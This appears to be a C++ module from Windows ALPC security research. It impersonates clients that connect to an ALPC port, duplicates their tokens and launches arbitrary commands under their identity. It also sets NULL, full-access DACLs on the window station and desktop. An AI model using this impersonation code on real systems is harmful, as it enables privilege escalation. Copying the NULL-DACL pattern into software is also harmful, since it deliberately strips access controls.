#include <iostream>
#include "ALPC.h"
#include <AclAPI.h>

#include "..\CPP-Util\Token.cpp"

void setWindowAccess() {
	DWORD error;
	wprintf(L"[*] Gettinng current process Window...");
	HWINSTA hWinSta = GetProcessWindowStation();
	if (hWinSta) {
		wprintf(L"Success.\n");
		wprintf(L"[*] Setting Security of current Proccess Window...");
		error = SetSecurityInfo(hWinSta,
			SE_WINDOW_OBJECT,
			DACL_SECURITY_INFORMATION,
			NULL,	// don't set the ownerSID
			NULL,	// don't set the primary GROUP
			NULL,	// DACL pointer, NULL=> full access to everyone
			NULL	// no setting SACL
		);
		if (error == ERROR_SUCCESS) wprintf(L"Success.\n");
		else wprintf(L"Error: %d.\n", error);
	}
	else wprintf(L"Error: %d.\n", GetLastError());
}

void setDesktopAccess() {
	DWORD error;
	wprintf(L"[*] Getting current Desktop..");
	HDESK hDesk = GetThreadDesktop(GetCurrentThreadId());
	if (hDesk) {
		wprintf(L"Success\n");
		wprintf(L"[*] Setting Security of current Desktop...");
		error = SetSecurityInfo(
			hDesk,
			SE_WINDOW_OBJECT,
			DACL_SECURITY_INFORMATION,
			NULL,	// don't set the ownerSID
			NULL,	// don't set the primary GROUP
			NULL,	// DACL pointer, NULL=> full access to everyone
			NULL	// no setting SACL
		);
		if (error == ERROR_SUCCESS) wprintf(L"Success\n");
		else wprintf(L"Error: %d\n", error);
	}
	else wprintf(L"Error: %d\n", GetLastError());
}

BOOL execCommand(HANDLE hDuppedToken, LPCWSTR command) {
	// -- Execute Process
	BOOL bSuccess;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	//SECURITY_ATTRIBUTES sa;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	//memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);
	wprintf(L"[*] Trying to launch '%s' with CreateProcessWithTokenW ... ", command);
	bSuccess = CreateProcessWithTokenW(
		hDuppedToken,
		0,
		command,
		NULL,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi
	);
	if (!bSuccess) {
		wprintf(L"failed (Error: %d).\n", GetLastError());
	}
	else wprintf(L"Success.\n");
	return bSuccess;
}

BOOL execImpersonatedWindowCommand(HANDLE hPort, ALPC_MESSAGE pmReceived, LPCWSTR command) {
	BOOL bSuccess;
	HANDLE hToken, hDuppedToken;
	//HANDLE hDuppedToken = INVALID_HANDLE_VALUE;
	
	wprintf(L"[*] Trying to impersonate client...");
	NTSTATUS lSuccess = NtAlpcImpersonateClientOfPort(
		hPort, // client connection port
		(PPORT_MESSAGE)&pmReceived,//&PortMessage,	// the port messages
		NULL			// reserved
	);
	if (NT_SUCCESS(lSuccess)) {
		wprintf(L"Success.\n");
		wprintf(L"[*] Trying to open Thread token...");
		bSuccess = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
		if (bSuccess) {
			wprintf(L"Success.\n");
			ExtractTokenInformation(hToken);

			// Duplicate Token
			wprintf(L"[*] Trying to duplicate impersonated token...");
			bSuccess = DuplicateTokenEx(hToken,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenPrimary,
				&hDuppedToken);
			if (bSuccess) wprintf(L"Success!\n");
			else wprintf(L"Error: %d.\n", GetLastError());
			ExtractTokenInformation(hDuppedToken);

			// -- Revert back to original thread identity 
			wprintf(L"Reverting back to self...");
			bSuccess = RevertToSelf();
			if (!bSuccess)
			{
				wprintf(L"Failed to revert back from RPC client impersonation to server identity. Error 0x%x.\n", GetLastError());
			}
			else printf("Success.\n");

			bSuccess = execCommand(hDuppedToken, command);
			// Close Handles
			CloseHandle(hToken);
			CloseHandle(hDuppedToken);
		}
		else {
			wprintf(L"Error: %d\n", GetLastError());
			bSuccess = false;
		}
	}
	else if (lSuccess == STATUS_ACCESS_DENIED) {
		wprintf(L"Access Denied! (Error: 0x%X) Maybe the ALPC_PORTFLG_AllowImpersonation was not set?\n", lSuccess);
		bSuccess = false;
	}
	else {
		wprintf(L"Error: 0x%X\n", lSuccess);
		bSuccess = false;
	}
	return bSuccess;
}